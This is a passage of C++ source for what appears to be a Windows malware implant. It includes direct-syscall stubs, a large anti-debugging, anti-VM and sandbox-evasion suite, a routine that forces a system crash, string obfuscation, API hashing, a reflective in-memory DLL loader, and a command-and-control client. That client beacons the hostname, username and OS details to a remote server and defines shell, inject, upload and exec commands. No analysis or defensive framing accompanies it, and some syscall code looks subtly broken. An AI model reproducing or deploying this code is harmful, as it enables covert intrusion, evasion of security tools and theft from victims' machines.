        TF_FORCEINLINE operator bool() const TF_NOTHROW { return ptr_ != nullptr; }
        TF_FORCEINLINE void reset() TF_NOTHROW { if (ptr_) { tf_crypto::secure_zero(ptr_, sz_); free(ptr_); ptr_ = nullptr; sz_ = 0; } }
        TF_FORCEINLINE PVOID release() TF_NOTHROW { PVOID r = ptr_; ptr_ = nullptr; sz_ = 0; return r; }

    private:
        PVOID ptr_;
        sz    sz_;
    };
};

class tf_syscall {
public:
    struct tf_ssdt_entry {
        u32 index;
        u32 arg_size;
        PVOID handler;
    };

    static TF_FORCEINLINE PVOID get_ntos_base() TF_NOTHROW {
        HMODULE h = nullptr;
        DWORD needed = 0;
        if (::EnumDeviceDrivers(nullptr, 0, &needed) && needed > 0) {
            LPVOID* arr = static_cast<LPVOID*>(_alloca(needed));
            if (::EnumDeviceDrivers(arr, needed, &needed) && needed > 0)
                h = static_cast<HMODULE>(arr[0]);
        }
        return h;
    }

    static TF_FORCEINLINE PVOID resolve_ssdt(u32 ssn) TF_NOTHROW {
        HMODULE ntos = get_ntos_base();
        if (!ntos) return nullptr;
        auto KiServiceTable = static_cast<const u32*>(::GetProcAddress(ntos, "KiServiceTable"));
        if (!KiServiceTable) return nullptr;
        u32 offset = KiServiceTable[ssn];
        offset >>= 4;
        return static_cast<u8*>(ntos) + offset;
    }

    static TF_FORCEINLINE NTSTATUS syscall_0(u32 ssn) TF_NOTHROW {
        NTSTATUS s;
        __asm__ volatile (
            "mov eax, %1\n"
            "mov r10, rcx\n"
            "syscall\n"
            "mov %0, eax\n"
            : "=a"(s) : "r"(ssn) : "rcx", "r10", "r11", "memory"
        );
        return s;
    }

    static TF_FORCEINLINE NTSTATUS syscall_1(u32 ssn, u64 a1) TF_NOTHROW {
        NTSTATUS s;
        __asm__ volatile (
            "mov eax, %1\n"
            "mov r10, rcx\n"
            "syscall\n"
            "mov %0, eax\n"
            : "=a"(s) : "r"(ssn), "d"(a1) : "rcx", "r10", "r11", "memory"
        );
        return s;
    }

    static TF_FORCEINLINE NTSTATUS syscall_2(u32 ssn, u64 a1, u64 a2) TF_NOTHROW {
        register u64 r8 __asm__("r8") = a2;
        NTSTATUS s;
        __asm__ volatile (
            "mov eax, %1\n"
            "mov r10, rcx\n"
            "syscall\n"
            "mov %0, eax\n"
            : "=a"(s) : "r"(ssn), "d"(a1), "r"(r8) : "rcx", "r10", "r11", "r9", "memory"
        );
        return s;
    }

    static TF_FORCEINLINE NTSTATUS syscall_3(u32 ssn, u64 a1, u64 a2, u64 a3) TF_NOTHROW {
        register u64 r8 __asm__("r8") = a2;
        register u64 r9 __asm__("r9") = a3;
        NTSTATUS s;
        __asm__ volatile (
            "mov eax, %1\n"
            "mov r10, rcx\n"
            "syscall\n"
            "mov %0, eax\n"
            : "=a"(s) : "r"(ssn), "d"(a1), "r"(r8), "r"(r9) : "rcx", "r10", "r11", "memory"
        );
        return s;
    }

    static TF_FORCEINLINE NTSTATUS syscall_4(u32 ssn, u64 a1, u64 a2, u64 a3, u64 a4) TF_NOTHROW {
        register u64 r8 __asm__("r8") = a2;
        register u64 r9 __asm__("r9") = a3;
        u64 stack[2] = { a4, 0 };
        NTSTATUS s;
        __asm__ volatile (
            "push %2\n"
            "mov eax, %1\n"
            "mov r10, rcx\n"
            "syscall\n"
            "add rsp, 8\n"
            "mov %0, eax\n"
            : "=a"(s) : "r"(ssn), "m"(stack[0]), "d"(a1), "r"(r8), "r"(r9)
            : "rcx", "r10", "r11", "memory"
        );
        return s;
    }

    static TF_FORCEINLINE NTSTATUS NtAllocateVirtualMemory_sys(HANDLE p, PVOID* a, ULONG_PTR z,
        PSIZE_T r, ULONG t, ULONG pr) TF_NOTHROW {
        return syscall_4(0x0018, u64(p), u64(a), u64(z), u64(r));
    }

    static TF_FORCEINLINE NTSTATUS NtProtectVirtualMemory_sys(HANDLE p, PVOID* a,
        PSIZE_T r, ULONG np, PULONG op) TF_NOTHROW {
        return syscall_4(0x0050, u64(p), u64(a), u64(r), u64(np));
    }

    static TF_FORCEINLINE NTSTATUS NtQuerySystemInformation_sys(u32 cls, PVOID buf,
        ULONG sz, PULONG ret) TF_NOTHROW {
        return syscall_4(0x0036, u64(cls), u64(buf), u64(sz), u64(ret));
    }
};

class tf_antidebug {
public:
    struct tf_debug_flags {
        u32 being_debugged : 1;
        u32 remote_debugger : 1;
        u32 hardware_bp : 1;
        u32 software_bp : 1;
        u32 vm_detected : 1;
        u32 sandbox : 1;
        u32 timing_anomaly : 1;
        u32 hooked_ntdll : 1;
        u32 reserved : 24;
    };

    static TF_FORCEINLINE bool check_peb_debug() TF_NOTHROW {
#ifdef _WIN64
        return *(volatile u8*)(__readgsqword(0x60) + 0x02) != 0;
#else
        return *(volatile u8*)(__readfsdword(0x30) + 0x02) != 0;
#endif
    }

    static TF_FORCEINLINE bool check_peb_ntglobalflag() TF_NOTHROW {
#ifdef _WIN64
        return (*(volatile u32*)(__readgsqword(0x60) + 0xBC) & 0x70) != 0;
#else
        return (*(volatile u32*)(__readfsdword(0x30) + 0x68) & 0x70) != 0;
#endif
    }

    static TF_FORCEINLINE bool check_process_debug_flags() TF_NOTHROW {
        HMODULE h = ::GetModuleHandleA("ntdll.dll");
        if (!h) return false;
        auto NtQueryInformationProcess = reinterpret_cast<NTSTATUS(WINAPI*)(HANDLE,ULONG,PVOID,ULONG,PULONG)>(
            ::GetProcAddress(h, "NtQueryInformationProcess"));
        if (!NtQueryInformationProcess) return false;
        ULONG_PTR debug = 0; ULONG ret = 0;
        NTSTATUS s = NtQueryInformationProcess(::GetCurrentProcess(), 7, &debug, sizeof(debug), &ret);
        return NT_SUCCESS(s) && debug != 0;
    }

    static TF_FORCEINLINE bool check_checkremotedebuggerpresent() TF_NOTHROW {
        BOOL b = FALSE;
        ::CheckRemoteDebuggerPresent(::GetCurrentProcess(), &b);
        return b != FALSE;
    }

    static TF_FORCEINLINE bool check_hardware_breakpoints() TF_NOTHROW {
        CONTEXT c = {}; c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (!::GetThreadContext(::GetCurrentThread(), &c)) return false;
        return (c.Dr0 | c.Dr1 | c.Dr2 | c.Dr3) != 0;
    }

    static TF_FORCEINLINE bool check_software_breakpoints() TF_NOTHROW {
        HMODULE m = ::GetModuleHandleA("ntdll.dll");
        if (!m) return false;
        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(static_cast<PVOID>(m));
        PIMAGE_NT_HEADERS nt = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<u8*>(m) + dos->e_lfanew);
        u8* base = static_cast<u8*>(m);
        u32 size = nt->OptionalHeader.SizeOfCode;
        u8* text = base + nt->OptionalHeader.BaseOfCode;
        u32 count = 0;
        for (u32 i = 0; i < size; ++i) if (text[i] == 0xCC) ++count;
        return count > 8;
    }

    static TF_FORCEINLINE bool check_timing(u32 threshold = 1000) TF_NOTHROW {
        u64 t0 = TF_RDTSC();
        for (volatile u32 i = 0; i < 100000; ++i) { volatile u32 x = i * 3; x += 1; }
        u64 t1 = TF_RDTSCP();
        return (t1 - t0) > u64(threshold) * 1000;
    }

    static TF_FORCEINLINE bool check_queryperformancecounter() TF_NOTHROW {
        LARGE_INTEGER f, t0, t1;
        if (!::QueryPerformanceFrequency(&f)) return false;
        ::QueryPerformanceCounter(&t0);
        ::Sleep(10);
        ::QueryPerformanceCounter(&t1);
        u64 delta = u64(t1.QuadPart - t0.QuadPart) * 1000000ULL / u64(f.QuadPart);
        return delta < 8000 || delta > 50000;
    }

    static TF_FORCEINLINE bool check_cpuid_hypervisor() TF_NOTHROW {
        int info[4] = {};
        TF_CPUID(info, 1);
        return (info[2] & (1 << 31)) != 0;
    }

    static TF_FORCEINLINE bool check_cpuid_brand() TF_NOTHROW {
        char brand[49] = {};
        int info[4];
        for (u32 i = 0; i < 3; ++i) {
            __cpuidex(info, 0x80000002 + i, 0);
            ::memcpy(brand + i*16, info, 16);
        }
        const char* bad[] = { "VMware", "VirtualBox", "KVM", "Xen", "Hyper-V", "QEMU", "Bochs" };
        for (auto b : bad) if (::strstr(brand, b)) return true;
        return false;
    }

    static TF_FORCEINLINE bool check_vm_registry() TF_NOTHROW {
        HKEY k = nullptr;
        if (::RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 0, KEY_READ, &k) != ERROR_SUCCESS)
            return false;
        char val[256] = {}; DWORD sz = sizeof(val), type = 0;
        bool r = false;
        if (::RegQueryValueExA(k, "0", nullptr, &type, (LPBYTE)val, &sz) == ERROR_SUCCESS) {
            const char* bad[] = { "VMware", "VBOX", "QEMU", "Xen", "Hyper-V" };
            for (auto b : bad) if (::strstr(val, b)) { r = true; break; }
        }
        ::RegCloseKey(k);
        return r;
    }

    static TF_FORCEINLINE bool check_low_resources() TF_NOTHROW {
        MEMORYSTATUSEX ms = {}; ms.dwLength = sizeof(ms);
        if (!::GlobalMemoryStatusEx(&ms)) return true;
        if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
        SYSTEM_INFO si; ::GetSystemInfo(&si);
        if (si.dwNumberOfProcessors < 2) return true;
        return false;
    }

    static TF_FORCEINLINE bool check_ntdll_hooks() TF_NOTHROW {
        HMODULE m = ::GetModuleHandleA("ntdll.dll");
        if (!m) return false;
        const char* names[] = {
            "NtQueryInformationProcess", "NtQuerySystemInformation",
            "NtAllocateVirtualMemory", "NtProtectVirtualMemory",
            "NtCreateThreadEx", "NtOpenProcess", "NtReadVirtualMemory"
        };
        for (auto n : names) {
            u8* p = static_cast<u8*>(::GetProcAddress(m, n));
            if (!p) continue;
            if (p[0] == 0xE9 || p[0] == 0xFF || (p[0] == 0x48 && p[1] == 0xB8) ||
                p[0] == 0x90 || p[0] == 0xCC)
                return true;
        }
        return false;
    }

    static TF_FORCEINLINE bool check_window_names() TF_NOTHROW {
        const char* bad[] = {
            "IDA", "OllyDbg", "x64dbg", "WinDbg", "Immunity",
            "Process Hacker", "Process Explorer", "Wireshark", "Fiddler",
            "Sandboxie", "Cuckoo", "Joe Sandbox", "VirusTotal"
        };
        for (auto n : bad) if (::FindWindowA(nullptr, n)) return true;
        return false;
    }

    static TF_FORCEINLINE u32 run_all_checks(tf_debug_flags* f = nullptr) TF_NOTHROW {
        u32 score = 0;
        tf_debug_flags tmp = {};
        if (!f) f = &tmp;
        if (check_peb_debug())            { f->being_debugged = 1; score += 10; }
        if (check_peb_ntglobalflag())     { f->being_debugged = 1; score += 8; }
        if (check_process_debug_flags())  { f->remote_debugger = 1; score += 15; }
        if (check_checkremotedebuggerpresent()) { f->remote_debugger = 1; score += 8; }
        if (check_hardware_breakpoints()) { f->hardware_bp = 1; score += 12; }
        if (check_software_breakpoints()) { f->software_bp = 1; score += 10; }
        if (check_timing())               { f->timing_anomaly = 1; score += 7; }
        if (check_queryperformancecounter()) { f->timing_anomaly = 1; score += 6; }
        if (check_cpuid_hypervisor())     { f->vm_detected = 1; score += 10; }
        if (check_cpuid_brand())          { f->vm_detected = 1; score += 15; }
        if (check_vm_registry())          { f->vm_detected = 1; score += 8; }
        if (check_low_resources())        { f->sandbox = 1; score += 10; }
        if (check_ntdll_hooks())          { f->hooked_ntdll = 1; score += 20; }
        if (check_window_names())         { f->being_debugged = 1; score += 5; }
        return score;
    }

    static TF_NOINLINE void suicide() TF_NOTHROW {
        HMODULE h = ::GetModuleHandleA("ntdll.dll");
        if (h) {
            auto RtlAdjustPrivilege = reinterpret_cast<NTSTATUS(WINAPI*)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN)>(
                ::GetProcAddress(h, "RtlAdjustPrivilege"));
            auto NtRaiseHardError = reinterpret_cast<NTSTATUS(WINAPI*)(NTSTATUS,ULONG,ULONG,PULONG_PTR,ULONG,PULONG)>(
                ::GetProcAddress(h, "NtRaiseHardError"));
            if (RtlAdjustPrivilege && NtRaiseHardError) {
                BOOLEAN e = FALSE; ULONG r = 0;
                RtlAdjustPrivilege(19, TRUE, FALSE, &e);
                NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &r);
            }
        }
        HANDLE p = ::GetCurrentProcess();
        ::TerminateProcess(p, STATUS_ACCESS_VIOLATION);
    }
};

class tf_stringenc {
public:
    template<u32 N, u32 Key = 0x9E37>
    struct tf_encstr {
        u8 data[N];
        static constexpr u32 key = Key;

        consteval tf_encstr(const char(&s)[N]) TF_NOTHROW : data{} {
            for (u32 i = 0; i < N; ++i)
                data[i] = u8(s[i] ^ ((Key + i * 0x1000193) & 0xFF));
        }

        TF_FORCEINLINE const char* get() const TF_NOTHROW {
            thread_local char buf[N];
            for (u32 i = 0; i < N; ++i)
                buf[i] = char(data[i] ^ ((Key + i * 0x1000193) & 0xFF));
            return buf;
        }

        TF_FORCEINLINE operator const char*() const TF_NOTHROW { return get(); }
    };

#define TF_XSTR(s) (::tf::tf_stringenc::tf_encstr<sizeof(s)>(s).get())

    static TF_FORCEINLINE void xor_crypt(u8* d, u32 n, const u8* k, u32 kn) TF_NOTHROW {
        for (u32 i = 0, j = 0; i < n; ++i, j = (j+1) % kn)
            d[i] ^= k[j];
    }

    static TF_FORCEINLINE u32 hash_fnv1a(const char* s) TF_NOTHROW {
        u32 h = 0x811C9DC5;
        while (*s) { h ^= u32(u8(*s++)); h *= 0x01000193; }
        return h;
    }

    static TF_FORCEINLINE u64 hash_fnv1a64(const char* s) TF_NOTHROW {
        u64 h = 0xCBF29CE484222325ULL;
        while (*s) { h ^= u64(u8(*s++)); h *= 0x100000001B3ULL; }
        return h;
    }
};

class tf_pe {
public:
    struct tf_export_info {
        u32 ordinal;
        u32 name_hash;
        PVOID address;
        const char* name;
    };

    static TF_FORCEINLINE PIMAGE_NT_HEADERS nt_headers(PVOID base) TF_NOTHROW {
        if (!base) return nullptr;
        auto dos = static_cast<PIMAGE_DOS_HEADER>(base);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
        auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<u8*>(base) + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
        return nt;
    }

    static TF_FORCEINLINE PVOID find_export(PVOID base, u32 name_hash) TF_NOTHROW {
        auto nt = nt_headers(base);
        if (!nt) return nullptr;
        auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!dir.Size) return nullptr;
        auto ed = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(static_cast<u8*>(base) + dir.VirtualAddress);
        auto names = reinterpret_cast<u32*>(static_cast<u8*>(base) + ed->AddressOfNames);
        auto addrs = reinterpret_cast<u32*>(static_cast<u8*>(base) + ed->AddressOfFunctions);
        auto ords  = reinterpret_cast<u16*>(static_cast<u8*>(base) + ed->AddressOfNameOrdinals);
        for (u32 i = 0; i < ed->NumberOfNames; ++i) {
            const char* n = reinterpret_cast<const char*>(base) + names[i];
            if (tf_stringenc::hash_fnv1a(n) == name_hash)
                return static_cast<u8*>(base) + addrs[ords[i]];
        }
        return nullptr;
    }

    static TF_FORCEINLINE PVOID get_module_by_hash(u32 hash) TF_NOTHROW {
#ifdef _WIN64
        auto ldr = reinterpret_cast<PPEB_LDR_DATA>(__readgsqword(0x60) + 0x18);
#else
        auto ldr = reinterpret_cast<PPEB_LDR_DATA>(__readfsdword(0x30) + 0x0C);
#endif
        auto head = &ldr->InMemoryOrderModuleList;
        for (auto e = head->Flink; e != head; e = e->Flink) {
            auto entry = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            const wchar_t* n = entry->FullDllName.Buffer;
            char ansi[256] = {};
            for (u32 i = 0; i < entry->FullDllName.Length / 2 && i < 255; ++i)
                ansi[i] = char(tolower(wchar_t(n[i])));
            if (tf_stringenc::hash_fnv1a(ansi) == hash)
                return entry->DllBase;
        }
        return nullptr;
    }

    static TF_FORCEINLINE PVOID get_proc_by_hash(PVOID mod, u32 hash) TF_NOTHROW {
        return find_export(mod, hash);
    }

    template<typename F>
    static TF_FORCEINLINE F resolve(u32 mod_hash, u32 proc_hash) TF_NOTHROW {
        PVOID m = get_module_by_hash(mod_hash);
        if (!m) return nullptr;
        return reinterpret_cast<F>(get_proc_by_hash(m, proc_hash));
    }

    static TF_FORCEINLINE bool map_to_memory(const u8* dll_bytes, PVOID* out_base,
        SIZE_T* out_size) TF_NOTHROW {
        auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(const_cast<u8*>(dll_bytes));
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
        auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(dll_bytes + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
        SIZE_T img_sz = nt->OptionalHeader.SizeOfImage;
        PVOID base = ::VirtualAlloc(nullptr, img_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!base) return false;
        ::memcpy(base, dll_bytes, nt->OptionalHeader.SizeOfHeaders);
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (u32 i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            if (sec->SizeOfRawData)
                ::memcpy(static_cast<u8*>(base) + sec->VirtualAddress,
                    dll_bytes + sec->PointerToRawData, sec->SizeOfRawData);
        }
        if (!fix_imports(base, nt) || !fix_relocations(base, nt)) {
            ::VirtualFree(base, 0, MEM_RELEASE);
            return false;
        }
        *out_base = base;
        *out_size = img_sz;
        return true;
    }

private:
    static TF_FORCEINLINE bool fix_imports(PVOID base, PIMAGE_NT_HEADERS nt) TF_NOTHROW {
        auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (!dir.Size) return true;
        auto desc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(static_cast<u8*>(base) + dir.VirtualAddress);
        for (; desc->Name; ++desc) {
            const char* dll = reinterpret_cast<const char*>(base) + desc->Name;
            HMODULE h = ::LoadLibraryA(dll);
            if (!h) return false;
            auto thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(static_cast<u8*>(base) +
                (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
            auto iat = reinterpret_cast<PIMAGE_THUNK_DATA>(static_cast<u8*>(base) + desc->FirstThunk);
            for (; thunk->u1.AddressOfData; ++thunk, ++iat) {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                    iat->u1.Function = reinterpret_cast<u64>(
                        ::GetProcAddress(h, MAKEINTRESOURCEA(IMAGE_ORDINAL(thunk->u1.Ordinal))));
                } else {
                    auto ibn = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                        static_cast<u8*>(base) + thunk->u1.AddressOfData);
                    iat->u1.Function = reinterpret_cast<u64>(::GetProcAddress(h, ibn->Name));
                }
                if (!iat->u1.Function) return false;
            }
        }
        return true;
    }

    static TF_FORCEINLINE bool fix_relocations(PVOID base, PIMAGE_NT_HEADERS nt) TF_NOTHROW {
        u64 delta = reinterpret_cast<u64>(base) - nt->OptionalHeader.ImageBase;
        if (!delta) return true;
        auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (!dir.Size) return true;
        auto block = reinterpret_cast<PIMAGE_BASE_RELOCATION>(static_cast<u8*>(base) + dir.VirtualAddress);
        u8* end = reinterpret_cast<u8*>(block) + dir.Size;
        while (reinterpret_cast<u8*>(block) < end) {
            u32 count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            auto entries = reinterpret_cast<u16*>(block + 1);
            u8* page = static_cast<u8*>(base) + block->VirtualAddress;
            for (u32 i = 0; i < count; ++i) {
                u16 e = entries[i];
                u16 type = e >> 12;
                u16 off = e & 0x0FFF;
                if (type == IMAGE_REL_BASED_DIR64)
                    *reinterpret_cast<u64*>(page + off) += delta;
                else if (type == IMAGE_REL_BASED_HIGHLOW)
                    *reinterpret_cast<u32*>(page + off) += u32(delta);
            }
            block = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
                reinterpret_cast<u8*>(block) + block->SizeOfBlock);
        }
        return true;
    }
};

class tf_network {
public:
    struct tf_http_response {
        u32  status;
        u32  content_length;
        std::vector<u8> body;
        std::string content_type;
    };

    class tf_socket {
    public:
        tf_socket() TF_NOTHROW : s_(INVALID_SOCKET) { init_wsa(); }
        explicit tf_socket(SOCKET s) TF_NOTHROW : s_(s) { init_wsa(); }
        ~tf_socket() TF_NOTHROW { close(); }
        tf_socket(tf_socket&& o) TF_NOTHROW : s_(o.s_) { o.s_ = INVALID_SOCKET; }
        tf_socket& operator=(tf_socket&& o) TF_NOTHROW {
            if (this != &o) { close(); s_ = o.s_; o.s_ = INVALID_SOCKET; }
            return *this;
        }
        tf_socket(const tf_socket&) = delete;
        tf_socket& operator=(const tf_socket&) = delete;

        TF_FORCEINLINE bool connect(const char* host, u16 port) TF_NOTHROW {
            ADDRINFOA hints = {}, *res = nullptr;
            hints.ai_family = AF_UNSPEC;
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_protocol = IPPROTO_TCP;
            char port_str[8];
            _itoa_s(port, port_str, 10);
            if (::getaddrinfo(host, port_str, &hints, &res) != 0) return false;
            bool ok = false;
            for (auto p = res; p; p = p->ai_next) {
                s_ = ::socket(p->ai_family, p->ai_socktype, p->ai_protocol);
                if (s_ == INVALID_SOCKET) continue;
                if (::connect(s_, p->ai_addr, (int)p->ai_addrlen) == 0) { ok = true; break; }
                ::closesocket(s_); s_ = INVALID_SOCKET;
            }
            ::freeaddrinfo(res);
            return ok;
        }

        TF_FORCEINLINE i32 send(const u8* d, i32 n) TF_NOTHROW {
            i32 sent = 0;
            while (sent < n) {
                i32 r = ::send(s_, reinterpret_cast<const char*>(d) + sent, n - sent, 0);
                if (r <= 0) return r;
                sent += r;
            }
            return sent;
        }

        TF_FORCEINLINE i32 recv(u8* d, i32 n, i32 timeout_ms = 30000) TF_NOTHROW {
            if (timeout_ms > 0) {
                DWORD t = timeout_ms;
                ::setsockopt(s_, SOL_SOCKET, SO_RCVTIMEO, (const char*)&t, sizeof(t));
            }
            return ::recv(s_, reinterpret_cast<char*>(d), n, 0);
        }

        TF_FORCEINLINE void close() TF_NOTHROW {
            if (s_ != INVALID_SOCKET) { ::closesocket(s_); s_ = INVALID_SOCKET; }
        }

        TF_FORCEINLINE operator bool() const TF_NOTHROW { return s_ != INVALID_SOCKET; }

    private:
        SOCKET s_;
        static std::atomic<u32> wsa_init_;
        static TF_FORCEINLINE void init_wsa() TF_NOTHROW {
            if (wsa_init_.fetch_or(1, std::memory_order_acq_rel) == 0) {
                WSADATA d; ::WSAStartup(MAKEWORD(2, 2), &d);
            }
        }
    };

    static TF_FORCEINLINE std::optional<tf_http_response> http_request(
        const char* method, const char* host, u16 port, const char* path,
        const u8* body = nullptr, u32 body_len = 0, const char* ua = nullptr) TF_NOTHROW {
        tf_socket s;
        if (!s.connect(host, port)) return std::nullopt;
        std::string req;
        req += method; req += " "; req += path; req += " HTTP/1.1\r\n";
        req += "Host: "; req += host; req += "\r\n";
        req += "User-Agent: ";
        req += ua ? ua : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        req += "\r\n";
        req += "Connection: close\r\n";
        if (body && body_len) {
            char cl[16]; _ultoa_s(body_len, cl, 10);
            req += "Content-Length: "; req += cl; req += "\r\n";
            req += "Content-Type: application/octet-stream\r\n";
        }
        req += "\r\n";
        if (s.send(reinterpret_cast<const u8*>(req.data()), (i32)req.size()) <= 0)
            return std::nullopt;
        if (body && body_len && s.send(body, (i32)body_len) <= 0)
            return std::nullopt;
        tf_http_response resp = {};
        std::vector<u8> buf(65536);
        i32 total = 0;
        while (true) {
            i32 r = s.recv(buf.data() + total, (i32)(buf.size() - total));
            if (r <= 0) break;
            total += r;
            if (total >= (i32)buf.size()) buf.resize(buf.size() * 2);
        }
        const char* p = reinterpret_cast<const char*>(buf.data());
        const char* end = p + total;
        if (total < 12 || ::memcmp(p, "HTTP/", 5) != 0) return std::nullopt;
        p += 5;
        while (*p && *p != ' ') ++p;
        if (*p == ' ') ++p;
        resp.status = ::atoi(p);
        const char* header_end = ::strstr(p, "\r\n\r\n");
        if (!header_end) return std::nullopt;
        header_end += 4;
        const char* cl_hdr = ::strstr(reinterpret_cast<const char*>(buf.data()), "Content-Length:");
        if (cl_hdr) resp.content_length = ::atoi(cl_hdr + 15);
        const char* ct_hdr = ::strstr(reinterpret_cast<const char*>(buf.data()), "Content-Type:");
        if (ct_hdr) {
            ct_hdr += 13;
            while (*ct_hdr == ' ') ++ct_hdr;
            const char* e = ct_hdr;
            while (*e && *e != '\r' && *e != '\n') ++e;
            resp.content_type.assign(ct_hdr, e);
        }
        u32 body_bytes = u32(end - header_end);
        resp.body.assign(header_end, header_end + body_bytes);
        return resp;
    }
};

std::atomic<u32> tf_network::tf_socket::wsa_init_{0};

class tf_c2 {
public:
    enum tf_cmd : u32 {
        CMD_NOP         = 0x0000,
        CMD_BEACON      = 0x0001,
        CMD_SHELL       = 0x0002,
        CMD_UPLOAD      = 0x0003,
        CMD_DOWNLOAD    = 0x0004,
        CMD_INJECT      = 0x0005,
        CMD_LOADMOD     = 0x0006,
        CMD_UNLOADMOD   = 0x0007,
        CMD_SETCONFIG   = 0x0008,
        CMD_GETSYSINFO  = 0x0009,
        CMD_KILL        = 0x000A,
        CMD_SLEEP       = 0x000B,
        CMD_UPDATEKEY   = 0x000C,
        CMD_EXEC        = 0x000D,
        CMD_RESPONSE    = 0x8000,
    };

    struct tf_packet_header {
        u32 magic;
        u32 version;
        u32 cmd;
        u32 req_id;
        u32 length;
        u32 checksum;
        u8  iv[12];
        u8  tag[16];
    };

    struct tf_config {
        char  c2_host[256];
        u16   c2_port;
        char  c2_path[128];
        u32   beacon_min;
        u32   beacon_max;
        u32   jitter;
        u8    key[32];
        u8    session_id[16];
        u32   session_key_derived;
    };

    explicit tf_c2(const tf_config* cfg) TF_NOTHROW : cfg_(*cfg), req_id_(1), running_(false) {
        derive_session_key();
    }

    TF_FORCEINLINE void start() TF_NOTHROW {
        running_.store(true, std::memory_order_release);
        thread_ = ::CreateThread(nullptr, 0, &tf_c2::thread_proc, this, 0, nullptr);
    }

    TF_FORCEINLINE void stop() TF_NOTHROW {
        running_.store(false, std::memory_order_release);
        if (thread_) { ::WaitForSingleObject(thread_, 5000); ::CloseHandle(thread_); thread_ = nullptr; }
    }

    TF_FORCEINLINE bool send_cmd(tf_cmd cmd, const u8* data, u32 len, std::vector<u8>* out = nullptr) TF_NOTHROW {
        tf_packet_header hdr = {};
        hdr.magic = TF_MAGIC;
        hdr.version = (TF_VERSION_MAJOR << 24) | (TF_VERSION_MINOR << 16) | TF_VERSION_BUILD;
        hdr.cmd = cmd;
        hdr.req_id = req_id_.fetch_add(1, std::memory_order_acq_rel);
        hdr.length = len;
        tf_crypto::rng_bytes(hdr.iv, sizeof(hdr.iv));
        std::vector<u8> ct(len + 16);
        tf_crypto::aes_ctx aes;
        tf_crypto::aes_init(&aes, skey_, 256);
        tf_crypto::aes_gcm_encrypt(&aes, hdr.iv, (const u8*)&hdr, 20, data, ct.data(), len, hdr.tag);
        hdr.checksum = tf_crypto::crc32(ct.data(), len);
        std::vector<u8> pkt(sizeof(hdr) + len);
        ::memcpy(pkt.data(), &hdr, sizeof(hdr));
        ::memcpy(pkt.data() + sizeof(hdr), ct.data(), len);
        auto resp = tf_network::http_request("POST", cfg_.c2_host, cfg_.c2_port,
            cfg_.c2_path, pkt.data(), (u32)pkt.size());
        if (!resp || resp->status != 200) return false;
        if (out && resp->body.size() > sizeof(hdr)) {
            *out = std::move(resp->body);
        }
        return true;
    }

    TF_FORCEINLINE bool beacon() TF_NOTHROW {
        u8 info[512] = {};
        build_sysinfo(info, sizeof(info));
        return send_cmd(CMD_BEACON, info, (u32)::strlen((char*)info) + 1);
    }

private:
    tf_config cfg_;
    u8        skey_[32];
    std::atomic<u32> req_id_;
    std::atomic<bool> running_;
    HANDLE    thread_;

    TF_FORCEINLINE void derive_session_key() TF_NOTHROW {
        tf_crypto::hkdf(cfg_.session_id, 16, cfg_.key, 32, (const u8*)"tf-c2-v3", 7, skey_, 32);
        cfg_.session_key_derived = 1;
    }

    TF_FORCEINLINE void build_sysinfo(u8* buf, u32 sz) TF_NOTHROW {
        char host[256] = {}, user[256] = {};
        DWORD hsz = sizeof(host), usz = sizeof(user);
        ::GetComputerNameA(host, &hsz);
        ::GetUserNameA(user, &usz);
        OSVERSIONINFOEXA os = {}; os.dwOSVersionInfoSize = sizeof(os);
        ::GetVersionExA((LPOSVERSIONINFOA)&os);
        SYSTEM_INFO si; ::GetNativeSystemInfo(&si);
        MEMORYSTATUSEX ms = {}; ms.dwLength = sizeof(ms); ::GlobalMemoryStatusEx(&ms);
        _snprintf_s((char*)buf, sz, _TRUNCATE,
            "host=%s&user=%s&os=%lu.%lu.%lu&arch=%u&cpu=%u&mem=%llu&sid=%02X%02X%02X%02X",
            host, user, os.dwMajorVersion, os.dwMinorVersion, os.dwBuildNumber,
            si.wProcessorArchitecture, si.dwNumberOfProcessors,
            (unsigned long long)ms.ullTotalPhys,
            cfg_.session_id[0], cfg_.session_id[1], cfg_.session_id[2], cfg_.session_id[3]);
    }

    static TF_FORCEINLINE DWORD WINAPI thread_proc(LPVOID p) TF_NOTHROW {
        auto self = static_cast<tf_c2*>(p);
        tf_crypto::tf_rng rng;
        while (self->running_.load(std::memory_order_acquire)) {
            self->beacon();
